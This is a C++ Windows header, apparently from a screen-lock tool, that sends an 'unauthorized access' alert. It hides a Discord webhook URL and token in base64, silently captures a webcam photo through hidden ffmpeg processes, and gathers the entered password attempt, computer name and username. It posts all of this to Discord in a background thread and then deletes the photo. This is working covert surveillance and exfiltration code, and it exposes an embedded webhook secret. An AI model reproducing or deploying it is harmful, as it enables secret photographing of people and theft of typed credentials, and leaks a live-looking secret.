#pragma once
#include <wininet.h>
#include <string>
#include <cstring>
#include <vector>
#pragma comment(lib, "wininet.lib")

inline std::string B64D(const char* in) {
    int T[128];
    memset(T, -1, sizeof(T));
    const char* a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; a[i]; i++) T[(int)a[i]] = i;
    std::string o;
    int v = 0, b = -8;
    for (int i = 0; in[i]; i++) {
        int c = (unsigned char)in[i];
        if (c >= 128 || T[c] == -1) break;
        v = (v << 6) + T[c];
        b += 6;
        if (b >= 0) {
            o += (char)((v >> b) & 0xFF);
            b -= 8;
        }
    }
    return o;
}

inline std::string JEsc(const std::string& s) {
    std::string r;
    for (char c : s) {
        if (c == '"') { r += '\\'; r += '"'; }
        else if (c == '\\') { r += '\\'; r += '\\'; }
        else r += c;
    }
    return r;
}

inline std::string GetWebhookUrl() {
    return B64D(
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
        "MTU1MTU0NTY3NDU2OTYxMzMyMy9LVXpDT3c0UFIzU180"
        "TXZMSEtKVnd4aDBWX2p2aFZSVUcwMG1KdzZCSUpHcGI1"
        "VnVSdHJpNk5wQ2ZuU1ZZOFJsVUJONg==");
}

inline std::string GetWebhookPath() {
    std::string url = GetWebhookUrl();
    size_t ps = url.find("/api/");
    return (ps != std::string::npos) ? url.substr(ps) : "/";
}

// Capture a photo using ffmpeg (silent, no window)
inline std::string CaptureWebcamPhoto() {
    // Get temp path
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string photoPath = std::string(tempPath) + "intruder_capture.jpg";

    // Delete old file if exists
    DeleteFileA(photoPath.c_str());

    // Find ffmpeg
    std::string ffmpegPath;
    const char* candidates[] = {
        "C:\\ProgramData\\chocolatey\\bin\\ffmpeg.exe",
        "C:\\ffmpeg\\bin\\ffmpeg.exe",
        "C:\\tools\\ffmpeg\\bin\\ffmpeg.exe"
    };
    for (const char* p : candidates) {
        if (GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) {
            ffmpegPath = p;
            break;
        }
    }

    // Also check PATH by trying "ffmpeg.exe" directly
    if (ffmpegPath.empty()) {
        // Search in PATH
        char foundPath[MAX_PATH];
        if (SearchPathA(NULL, "ffmpeg.exe", NULL, MAX_PATH, foundPath, NULL)) {
            ffmpegPath = foundPath;
        }
    }

    if (ffmpegPath.empty()) return "";

    // Step 1: List devices to find camera name
    std::string listCmd = "\"" + ffmpegPath + "\" -list_devices true -f dshow -i dummy";
    
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    std::vector<char> cmdBuf(listCmd.begin(), listCmd.end());
    cmdBuf.push_back('\0');

    if (!CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "";
    }
    CloseHandle(hWritePipe);

    // Read output
    std::string devOutput;
    char buf[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        devOutput += buf;
    }
    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Parse camera name - find first (video) device
    std::string camName;
    std::string bestCam;
    size_t pos = 0;
    while ((pos = devOutput.find("\"", pos)) != std::string::npos) {
        size_t end = devOutput.find("\"", pos + 1);
        if (end == std::string::npos) break;
        std::string name = devOutput.substr(pos + 1, end - pos - 1);
        // Check if next part has (video)
        size_t checkEnd = devOutput.find("\n", end);
        std::string rest = devOutput.substr(end, checkEnd != std::string::npos ? checkEnd - end : 50);
        if (rest.find("(video)") != std::string::npos) {
            if (bestCam.empty()) bestCam = name;
            // Prefer non-virtual cameras
            if (name.find("Virtual") == std::string::npos && name.find("OBS") == std::string::npos) {
                camName = name;
            }
        }
        pos = end + 1;
    }
    if (camName.empty()) camName = bestCam;
    if (camName.empty()) return "";

    // Step 2: Capture one frame
    std::string captureCmd = "\"" + ffmpegPath + "\" -y -f dshow -i \"video=" + camName + "\" -frames:v 1 -q:v 2 \"" + photoPath + "\"";
    
    STARTUPINFOA si2 = {};
    si2.cb = sizeof(si2);
    si2.dwFlags = STARTF_USESHOWWINDOW;
    si2.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi2 = {};
    std::vector<char> cmdBuf2(captureCmd.begin(), captureCmd.end());
    cmdBuf2.push_back('\0');

    if (CreateProcessA(NULL, cmdBuf2.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
        WaitForSingleObject(pi2.hProcess, 10000); // Wait up to 10 seconds
        CloseHandle(pi2.hProcess);
        CloseHandle(pi2.hThread);
    }

    // Verify file exists and has data
    HANDLE hFile = CreateFileA(photoPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return "";
    DWORD fileSize = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    
    if (fileSize < 1000) {
        DeleteFileA(photoPath.c_str());
        return "";
    }

    return photoPath;
}

// Read file into byte vector
inline std::vector<char> ReadFileBytes(const std::string& path) {
    std::vector<char> data;
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return data;
    DWORD fileSize = GetFileSize(hFile, NULL);
    data.resize(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    return data;
}

struct WH_Data {
    std::string key, pc, usr;
};

inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
    WH_Data* d = (WH_Data*)p;
    std::string path = GetWebhookPath();
    const char* ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    // Step 1: Capture webcam photo
    std::string photoPath = CaptureWebcamPhoto();

    // Step 2: Build JSON payload
    char q = '"';
    std::string nl(1, (char)92);
    nl += 'n';

    std::string json;
    json += '{';
    json += q; json += "username"; json += q; json += ':';
    json += q; json += "Lock Engine Alert"; json += q; json += ',';
    json += q; json += "embeds"; json += q; json += ":[{";
    json += q; json += "title"; json += q; json += ':';
    json += q; json += "CANH BAO: TRUY CAP TRAI PHEP!"; json += q; json += ',';
    json += q; json += "color"; json += q; json += ":15158332,";
    json += q; json += "fields"; json += q; json += ":[";
    // Field 1: attempted key
    json += "{"; json += q; json += "name"; json += q; json += ':';
    json += q; json += "Mat khau da thu"; json += q; json += ',';
    json += q; json += "value"; json += q; json += ':';
    json += q; json += "`"; json += JEsc(d->key); json += "`"; json += q; json += "},";
    // Field 2: machine info
    json += "{"; json += q; json += "name"; json += q; json += ':';
    json += q; json += "May tinh"; json += q; json += ',';
    json += q; json += "value"; json += q; json += ':';
    json += q; json += JEsc(d->pc); json += " / "; json += JEsc(d->usr); json += q; json += "}";
    json += "]";
    
    // Add image reference if photo was captured
    if (!photoPath.empty()) {
        json += ","; json += q; json += "image"; json += q; json += ":{";
        json += q; json += "url"; json += q; json += ':';
        json += q; json += "attachment://intruder_capture.jpg"; json += q;
        json += "}";
    }
    
    json += "}]}";

    // Step 3: Send to Discord
    HINTERNET h1 = InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (h1) {
        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (h2) {
            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
            HINTERNET h3 = HttpOpenRequestA(h2, "POST", path.c_str(), NULL, NULL, NULL, fl, 0);
            if (h3) {
                if (!photoPath.empty()) {
                    // Multipart upload with photo
                    std::vector<char> fileData = ReadFileBytes(photoPath);
                    if (!fileData.empty()) {
                        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
                        std::string contentType = "multipart/form-data; boundary=" + boundary;

                        std::string body;
                        body += "--" + boundary + "\r\n";
                        body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
                        body += "Content-Type: application/json; charset=utf-8\r\n\r\n";
                        body += json + "\r\n";
                        body += "--" + boundary + "\r\n";
                        body += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"intruder_capture.jpg\"\r\n";
                        body += "Content-Type: image/jpeg\r\n\r\n";

                        // Combine text + binary + footer
                        std::string footer = "\r\n--" + boundary + "--\r\n";
                        
                        std::vector<char> fullBody;
                        fullBody.insert(fullBody.end(), body.begin(), body.end());
                        fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
                        fullBody.insert(fullBody.end(), footer.begin(), footer.end());

                        std::string hdr = "Content-Type: " + contentType + "\r\n";
                        HttpSendRequestA(h3, hdr.c_str(), (DWORD)hdr.size(),
                            fullBody.data(), (DWORD)fullBody.size());
                    }
                } else {
                    // Text-only webhook (no photo)
                    const char* hdr = "Content-Type: application/json\r\n";
                    HttpSendRequestA(h3, hdr, -1, (LPVOID)json.c_str(), (DWORD)json.size());
                }
                InternetCloseHandle(h3);
            }
            InternetCloseHandle(h2);
        }
        InternetCloseHandle(h1);
    }

    // Cleanup photo
    if (!photoPath.empty()) {
        DeleteFileA(photoPath.c_str());
    }

    delete d;
    return 0;
}

inline void SendDirectWebhook(const std::wstring& attemptedKey) {
    WH_Data* wd = new WH_Data();

    int kl = WideCharToMultiByte(CP_UTF8, 0, attemptedKey.c_str(), -1, NULL, 0, NULL, NULL);
    if (kl > 1) {
        wd->key.resize(kl - 1);
        WideCharToMultiByte(CP_UTF8, 0, attemptedKey.c_str(), -1, &wd->key[0], kl, NULL, NULL);
    }

    char buf[256] = {};
    DWORD bl = sizeof(buf);
    GetComputerNameA(buf, &bl);
    wd->pc = buf;

    bl = sizeof(buf);
    GetUserNameA(buf, &bl);
    wd->usr = buf;

    CreateThread(NULL, 0, DirectWebhookThread, wd, 0, NULL);
}
